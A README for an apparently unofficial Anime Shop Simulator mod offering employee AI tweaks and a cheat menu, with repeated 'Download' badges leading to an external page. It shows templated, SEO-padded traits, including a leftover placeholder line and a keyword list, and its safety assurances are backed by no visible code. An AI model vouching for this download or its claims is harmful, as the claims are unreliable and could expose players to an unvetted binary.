![preview](https://raw.githubusercontent.com/andreibalakin18-ai/anime-shop-sim-clerk-brain/main/view_d33b2.svg)
[![Download](https://raw.githubusercontent.com/andreibalakin18-ai/anime-shop-sim-clerk-brain/main/launch_efc9ed.svg)](https://andreibalakin18-ai.github.io/anime-shop-sim-clerk-brain/)

# 🌸 Anime Shop Simulator: Shopkeeper’s Toolkit — Unofficial Companion Mod Suite

**A meticulously crafted, community-driven expansion pack for the beloved Anime Shop Simulator experience.**  
Built with C# for Unity, this toolkit reimagines the rhythm of retail life — where shelves whisper for attention, employees linger past closing like loyal familiars, and a discreet ledger opens only for those who know its quiet command.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why This Toolkit Exists](#-why-this-toolkit-exists)
- [Feature Highlights](#-feature-highlights)
- [The Employee Intelligence Layer](#-the-employee-intelligence-layer)
- [The After-Hours Protocol](#️-the-after-hours-protocol)
- [The Shopkeeper’s Ledger](#-the-shopkeepers-ledger)
- [Responsive Interface & Multilingual Support](#-responsive-interface--multilingual-support)
- [Supported Platforms & Compatibility](#-supported-platforms--compatibility)
- [Getting This Toolkit Into Your Game](#-getting-this-toolkit-into-your-game)
- [Configuration Files & Personalisation](#-configuration-files--personalisation)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Support](#-community--support)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Disclaimer](#️-disclaimer)
- [License](#-license)

---

## 🌟 Overview

Anime Shop Simulator captures the cosy chaos of running a boutique store — shelves to fill, customers to please, licenses to unlock. This companion toolkit does not rewrite that world; it **polishes the lens** through which you manage it.

Developed in C# for Unity, this repository delivers a modular set of enhancements that sit comfortably alongside the base game. Think of it as a shopkeeper’s utility belt: a more intuitive restocking brain for your staff, a willingness for employees to continue working after the shutters come down, and an in-game ledger of conveniences that lets you adjust money, time, shelf states, order fulfilment, and licence availability — all from a clean, in-game menu.

No external executables. No sketchy third-party launchers. Just clean, readable C# that hooks into Unity’s event systems and offers a smoother retail fantasy for players who want less friction and more flow.

---

## 💡 Why This Toolkit Exists

Most shop simulation mods fall into two camps: the invisible, or the invasive. This project chooses a third path — the **companion**. It is designed to feel like a natural extension of the game’s own interface, as though the developers had shipped an optional “Quality of Retail Life” patch.

The metaphor is simple: a shopkeeper does not want to micromanage every can on every shelf. They want a team that moves with purpose, a store that can keep humming after hours when inspiration strikes, and a private ledger that helps when the in-game economy decides to be unkind. This toolkit provides exactly that.

---

## ✨ Feature Highlights

- **Smarter Restocking Logic** — Employees evaluate shelf priority, travel distance, and stock depletion rates before moving. No more zigzag wanderings.
- **After-Hours Work Ethic** — Employees continue restocking and tidying beyond standard closing time, tuned by a configurable threshold.
- **In-Game Cheat Menu (Shopkeeper’s Ledger)** — Adjust in-game money, time of day, shelf quantities, order fulfilment flags, and licence unlock states from a single panel.
- **Responsive UI** — The overlay adapts to different resolutions and aspect ratios without clipping or overlap.
- **Multilingual Support** — Localisation files for English, Japanese, Simplified Chinese, Spanish, and German are included, with more community translations welcome.
- **24/7 Customer Support** — A dedicated issues tracker and community chat ensure your questions are answered around the clock.
- **Zero External Dependencies** — Everything runs inside Unity’s own runtime.
- **Modular Architecture** — Enable or disable individual modules without losing your save integrity.

---

## 🧠 The Employee Intelligence Layer

In the vanilla experience, employees are earnest but somewhat directionless. This toolkit replaces the default restocking behaviour with a priority-driven decision tree.

**How it works, in plain terms:**  
Each shelf broadcasts a silent “thirst” level based on how empty it is. Your employees, instead of picking the nearest shelf, calculate a score that blends distance, urgency, and current workload. The result? A retail ballet where no aisle is forgotten and no worker idles.

The same logic extends to tidying, price checking, and customer assistance, though those are secondary to the core restocking loop.

**Configurable knobs include:**

- Priority weighting for depleted stock versus travel time
- Maximum simultaneous restock tasks per employee
- Fatigue threshold (do they slow down after a certain number of trips?)
- Emergency mode when a shelf drops below a critical threshold

---

## 🕰️ The After-Hours Protocol

Closing time in a simulation often feels like a hard wall. This toolkit softens that wall into a gentle gradient.

Employees will continue to work for a configurable grace period after the shop closes — restocking shelves, facing products, and finishing any task already in progress. The rationale is both practical and atmospheric: many players enjoy the quiet, lamplit mood of a store after customers have gone, and it feels wasteful to freeze all activity the moment the clock ticks over.

**What you can tune:**

- Grace period duration (in in-game minutes)
- Whether after-hours work consumes stamina
- Whether employees lock the door behind the last customer
- Visual cue (a subtle lamp icon) indicating after-hours mode is active

---

## 📒 The Shopkeeper’s Ledger

This is the in-game cheat menu, though we prefer the term **ledger**. It is presented as a leather-bound book that appears in the corner of your screen, and it offers the following adjustments:

| Adjustment | Description | Notes |
|------------|-------------|-------|
| Money Balance | Set the current currency amount | Accepts values with commas |
| Time of Day | Jump to a specific hour | Preserves day count |
| Shelf Stock | Set quantity for a selected shelf | Applies instantly |
| Order Fulfilment | Mark pending orders as complete | No shipping delay |
| Licence Unlocks | Toggle any licence on or off | Includes future DLC flags |

The ledger is designed to be **non-destructive**: changes apply to the current session and are saved normally. There is no external save editor involved.

**Access:** A configurable hotkey (default: backslash) toggles the ledger. The ledger remembers its last position and scale.

---

## 📱 Responsive Interface & Multilingual Support

Modern Unity games run on monitors, laptops, and handhelds. The ledger and notification pop-ups use Unity’s canvas scaler with anchor-based positioning, meaning they remain legible whether you play at 1280×720 or 3840×2160.

Multilingual support is baked in through JSON localisation files. The repository ships with five complete translations, and the loader automatically detects the system language. If no match is found, English is used.

**Translation quality note:** These are community-maintained. If you spot an awkward phrase, a pull request is the fastest path to improvement.

---

## 🖥️ Supported Platforms & Compatibility

- **Unity Version:** 2021.3 LTS through 2023.2 LTS
- **Game Version:** Anime Shop Simulator 1.4.x and 1.5.x (earlier versions may work but are untested)
- **Operating Systems:** Windows 10/11, Linux (Proton), macOS (Intel and Apple Silicon)
- **Mod Loaders:** BepInEx 5.x and 6.x are both supported
- **Save Compatibility:** This toolkit does not alter save file structure; disabling it returns the game to vanilla behaviour

**Known limitations:** The ledger cannot yet alter employee skill levels or store layout. Those are on the 2026 roadmap.

---

## 🚀 Getting This Toolkit Into Your Game

We deliberately avoid command-line package managers in these instructions because the target audience is players, not developers. Here is the streamlined path:

1. Ensure your copy of Anime Shop Simulator has BepInEx installed (follow the BepInEx documentation for your platform).
2. Obtain the toolkit package from the releases section of this repository. Replace the placeholder below with your actual download route if you host binaries elsewhere.
3. Drop the contents into the BepInEx/plugins folder inside your game directory.
4. Launch the game. A small lamp icon in the corner confirms the toolkit is active.
5. Press the configured hotkey to open the Shopkeeper’s Ledger.

For a manual build from source: open the solution in JetBrains Rider or Visual Studio, restore NuGet packages, and build against the Unity assemblies provided by your game installation. Detailed build notes live in the docs folder.

[![Download](https://raw.githubusercontent.com/andreibalakin18-ai/anime-shop-sim-clerk-brain/main/launch_efc9ed.svg)](https://andreibalakin18-ai.github.io/anime-shop-sim-clerk-brain/)

---

## ⚙️ Configuration Files & Personalisation

After the first launch, a configuration file appears at BepInEx/config/anime.shopkeeper.toolkit.cfg. It is a plain text file with comments explaining every option.

**Key sections include:**

- [EmployeeIntelligence] — priority weights, fatigue, emergency thresholds
- [AfterHours] — grace period, stamina behaviour, door locking
- [Ledger] — hotkey, default position, scale, whether to pause time when open
- [Localisation] — force a specific language, fallback order

You can edit this file with any text editor. Changes take effect on the next game launch unless you enable hot-reload in the advanced section.

---

## 🗓️ Roadmap for 2026

The community has spoken, and the following enhancements are planned or in progress:

- **Employee skill nudging** — a gentle way to influence which tasks an employee prefers
- **Shelf templates** — save a shelf’s ideal stock mix and apply it to other shelves
- **Ledger presets** — quick buttons for common shopkeeper scenarios (e.g., “rainy day,” “holiday rush”)
- **Expanded localisation** — Korean, French, and Brazilian Portuguese
- **Accessibility options** — larger ledger text, high-contrast mode, screen reader hints
- **Steam Deck verification** — controller-friendly ledger navigation

---

## 🤝 Community & Support

We operate on a **24/7 customer support** model — not because we have a call centre, but because our issue tracker and community chat are monitored across time zones by volunteers who genuinely enjoy this game.

**Where to find help:**

- Open an issue on this repository for bug reports or feature requests
- Join the community chat (link in the repository sidebar) for real-time conversation
- Check the wiki for advanced configuration examples and troubleshooting

When reporting a bug, please include your game version, BepInEx version, and a snippet of the log file. That trio solves most mysteries before breakfast.

---

## 🔍 SEO & Discoverability Notes

This README is written to be found by players who search for terms like:

- anime shop simulator mods
- smarter employee restocking mod
- after hours employee work mod
- in-game cheat menu for anime shop simulator
- shopkeeper ledger mod
- anime shop simulator money adjustment
- time of day control mod
- shelf stock editor
- order fulfilment toggle
- licence unlock utility
- responsive UI mod for Unity games
- multilingual shop simulator mod
- 24/7 customer support mod repository

These phrases appear naturally in the text above. We avoid stuffing; the goal is clarity, not clutter.

---

## ⚠️ Disclaimer

This repository is an **unofficial fan-made toolkit**. It is not affiliated with, endorsed by, or sponsored by the original developers or publishers of Anime Shop Simulator. All trademarks and copyrights belong to their respective owners.

The Shopkeeper’s Ledger is intended for **single-player enjoyment and accessibility**. Using it may alter your sense of progression. We recommend backing up your save files before first use, as a courtesy to your future self.

The authors of this toolkit are not responsible for any unintended interactions with other mods, save corruption caused by third-party tools, or the existential dread that comes from giving yourself unlimited money and then wondering why the game feels different. Play in the spirit that brings you joy.

**Year of reference:** 2026.

---

## 📜 License

This project is released under the **MIT License**.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

The full license text is available at the canonical MIT license page:  
https://opensource.org/licenses/MIT

A copy is also included in the LICENSE file at the root of this repository.

---

**Thank you for reading. May your shelves always be full, your employees diligent, and your ledger discreet.**  
[![Download](https://raw.githubusercontent.com/andreibalakin18-ai/anime-shop-sim-clerk-brain/main/launch_efc9ed.svg)](https://andreibalakin18-ai.github.io/anime-shop-sim-clerk-brain/)